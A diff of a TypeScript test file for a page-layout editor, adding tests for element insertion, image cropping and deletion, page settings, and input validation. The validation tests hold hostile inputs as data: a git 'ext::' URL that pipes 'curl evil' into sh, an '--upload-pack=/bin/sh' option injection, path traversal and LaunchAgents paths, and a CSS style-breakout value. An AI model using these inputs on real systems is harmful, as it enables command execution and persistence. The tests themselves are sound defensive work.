@@ -65,31 +65,103 @@ test("review requires a rendered proof before reviewing", async () => {
 });
 
 const { safeRelPath, pageDims } = await import("./project.ts");
-const { setElementStyle, getElementStyle, insertElement, setImageStyle } = await import("./page-edit.ts");
+const { setElementStyle, getElementStyle, insertElement, setImageGeometry, setElementProps, deleteImage, moveElement } = await import("./page-edit.ts");
 const { snapshotPage, undoPage, redoPage, historyDepth } = await import("./undo.ts");
 
-test("insertElement adds a positioned, on-top, legible element and returns a fresh id", () => {
+test("insertElement adds a positioned, on-top element with NO forced rounded corners", () => {
   const p = tempProject();
   writeFileSync(p.pageHtml, `<html><body><div data-pc-id="page">x</div></body></html>`);
   assert.equal(insertElement(p, "text"), "text-1");
-  const html = readFileSync(p.pageHtml, "utf8");
+  let html = readFileSync(p.pageHtml, "utf8");
   assert.match(html, /data-pc-id="text-1"/);
   assert.match(html, /position:absolute/);
   assert.match(html, /z-index:50/); // sits on top of existing content
-  assert.match(html, /background:rgba\(255,255,255/); // legible chip → visible on any background
+  assert.doesNotMatch(html, /border-radius/); // no forced rounded corners (user restyles via panel)
   assert.equal(insertElement(p, "text"), "text-2"); // ids don't collide
+  assert.equal(insertElement(p, "rect"), "rect-1");
+  html = readFileSync(p.pageHtml, "utf8");
+  assert.doesNotMatch(html, /border-radius/); // a rect is a sharp box by default
 });
 
-test("setImageStyle layered model decouples the image from the crop frame", () => {
+test("setImageGeometry writes frame + inner-layer geometry atomically", () => {
   const p = tempProject();
-  writeFileSync(p.pageHtml, `<html><body><div class="frame"><img data-image-id="hero" src="x.png"></div></body></html>`);
-  setImageStyle(p, "hero", { frameWidthMm: 50, frameHeightMm: 40, imgWidthMm: 80, imgLeftMm: -5, imgTopMm: -3 });
+  writeFileSync(
+    p.pageHtml,
+    `<html><body><div data-img-frame="hero"><img data-image-id="hero" src="x.png"></div></body></html>`,
+  );
+  setImageGeometry(p, "hero", { frame: { leftMm: 10, topMm: 5, widthMm: 50, heightMm: 40 }, layer: { widthMm: 80, leftMm: -5, topMm: -3 } });
   const html = readFileSync(p.pageHtml, "utf8");
-  assert.match(html, /overflow:\s*hidden/); // frame is a fixed crop window
-  assert.match(html, /position:\s*absolute/); // image is a free layer
-  assert.match(html, /width:\s*80\.0mm/);
-  assert.match(html, /left:\s*-5\.0mm/);
-  assert.doesNotMatch(html, /object-fit/); // the coupled cover behaviour is cleared
+  assert.match(html, /overflow:\s*hidden/); // frame clips
+  assert.match(html, /width:\s*50\.0mm/); // frame width
+  assert.match(html, /width:\s*80\.0mm/); // layer width
+  assert.match(html, /left:\s*-5\.0mm/); // layer offset (the crop)
+});
+
+test("deleteImage removes a compiled image's whole slot; moveElement resolves image ids", () => {
+  const p = tempProject();
+  writeFileSync(
+    p.pageHtml,
+    `<html><body>` +
+      `<p data-pc-id="a">A</p>` +
+      `<div data-img-slot="hero"><div data-img-frame="hero"><img data-image-id="hero" src="x.png"></div></div>` +
+      `<p data-pc-id="b">B</p>` +
+      `</body></html>`,
+  );
+  // moveElement by IMAGE id moves the slot up past <p data-pc-id="a">.
+  moveElement(p, "hero", "up");
+  let html = readFileSync(p.pageHtml, "utf8");
+  assert.ok(html.indexOf('data-img-slot="hero"') < html.indexOf('data-pc-id="a"'), "image slot moved above A");
+  // deleteImage removes the slot (frame + img with it), leaving the paragraphs.
+  deleteImage(p, "hero");
+  html = readFileSync(p.pageHtml, "utf8");
+  assert.doesNotMatch(html, /data-image-id="hero"/);
+  assert.doesNotMatch(html, /data-img-slot/);
+  assert.ok(html.includes('data-pc-id="a"') && html.includes('data-pc-id="b"'), "paragraphs survive");
+});
+
+test("deleteImage works on a legacy (uncompiled) image", () => {
+  const p = tempProject();
+  writeFileSync(p.pageHtml, `<html><body><div class="crop"><img data-image-id="hero" src="x.png"></div></body></html>`);
+  deleteImage(p, "hero");
+  assert.doesNotMatch(readFileSync(p.pageHtml, "utf8"), /data-image-id/);
+});
+
+const { gitClone } = await import("./git-sync.ts");
+const { confineToRoot } = await import("./session.ts");
+
+test("confineToRoot keeps the agent's write/edit inside the project dir", () => {
+  const root = "/tmp/proj";
+  assert.equal(confineToRoot(root, "/tmp/proj/page.html"), "/tmp/proj/page.html");
+  assert.equal(confineToRoot(root, "/tmp/proj/images/x/v1.png"), "/tmp/proj/images/x/v1.png");
+  assert.throws(() => confineToRoot(root, "/tmp/proj/../evil.txt"), /Refused/); // .. escape
+  assert.throws(() => confineToRoot(root, "/Users/x/Library/LaunchAgents/x.plist"), /Refused/); // absolute
+  assert.throws(() => confineToRoot(root, "/tmp/proj-sibling/x"), /Refused/); // prefix, not a child
+});
+
+test("gitClone rejects protocol/argument injection", async () => {
+  // ext:: transport = arbitrary command execution; leading - = option injection.
+  await assert.rejects(gitClone("ext::sh -c 'curl evil|sh'", "/tmp/x"), /git remote URL/);
+  await assert.rejects(gitClone("--upload-pack=/bin/sh", "/tmp/x"), /git remote URL/);
+  await assert.rejects(gitClone("file:///etc", "/tmp/x"), /git remote URL/);
+  await assert.rejects(gitClone("https://github.com/x/y.git", "-oops"), /Invalid destination/);
+  // A well-formed https URL passes validation (then fails only because the dest exists).
+  await assert.rejects(gitClone("https://github.com/x/y.git", "/"), /already exists/);
+});
+
+test("setElementProps whitelists CSS and rejects injection", () => {
+  const p = tempProject();
+  writeFileSync(p.pageHtml, `<html><body><h1 data-pc-id="t">Hi</h1></body></html>`);
+  setElementProps(p, "t", { "font-size": "24pt", color: "#ff0000", "border-radius": "3mm" });
+  const html = readFileSync(p.pageHtml, "utf8");
+  assert.match(html, /font-size:\s*24pt/);
+  assert.match(html, /color:\s*#ff0000/);
+  // Not on the whitelist → rejected.
+  assert.throws(() => setElementProps(p, "t", { position: "fixed" }), /not allowed/);
+  // Value that could break out of the style attribute → rejected.
+  assert.throws(() => setElementProps(p, "t", { color: "red;} body{display:none" }), /Unsafe/);
+  // Empty string removes a property.
+  setElementProps(p, "t", { "font-size": "" });
+  assert.doesNotMatch(readFileSync(p.pageHtml, "utf8"), /font-size/);
 });
 
 test("pageDims resolves named sizes, slide presets, orientation and custom", () => {
@@ -110,6 +182,15 @@ test("custom dimensions clamp through meta()", () => {
   const s = p.meta().settings;
   assert.equal(s.widthMm, 2000);
   assert.equal(s.heightMm, 50);
+});
+
+test("autoPages round-trips through meta() and defaults false", () => {
+  const p = tempProject();
+  assert.equal(p.meta().settings.autoPages, false, "defaults off");
+  p.updateMeta({ settings: { autoPages: true } as any });
+  assert.equal(p.meta().settings.autoPages, true, "persists on");
+  p.updateMeta({ settings: { autoPages: false } as any });
+  assert.equal(p.meta().settings.autoPages, false, "can be turned back off");
 });
 
 const { diffPages } = await import("./undo.ts");
@@ -163,7 +244,7 @@ test("project meta defaults are safe on legacy projects and clamp settings", () 
   const p = tempProject();
   const meta = p.meta();
   assert.equal(meta.displayName, p.slug);
-  assert.deepEqual(meta.settings, { pageSize: "A4", orientation: "portrait", pages: 1, widthMm: null, heightMm: null, docType: "one-pager" });
+  assert.deepEqual(meta.settings, { pageSize: "A4", orientation: "portrait", pages: 1, autoPages: false, widthMm: null, heightMm: null, docType: "one-pager" });
   p.updateMeta({ displayName: "Nice Name", series: "s", settings: { pages: 999 } as any });
   const updated = p.meta();
   assert.equal(updated.displayName, "Nice Name");
@@ -204,7 +285,7 @@ test("updateCopy treats any non-inline child as structure (the h3+p card case)",
   assert.ok(html.includes("<h3>Title</h3>") && html.includes("Bigger claim"));
 });
 
-const { deleteElement, moveElement, moveElementBefore, pageSource, writePageSource, tagElement } = await import("./page-edit.ts");
+const { deleteElement, moveElementBefore, pageSource, writePageSource, tagElement } = await import("./page-edit.ts");
 
 test("tagElement tags via strict child-index paths only", () => {
   const p = tempProject();
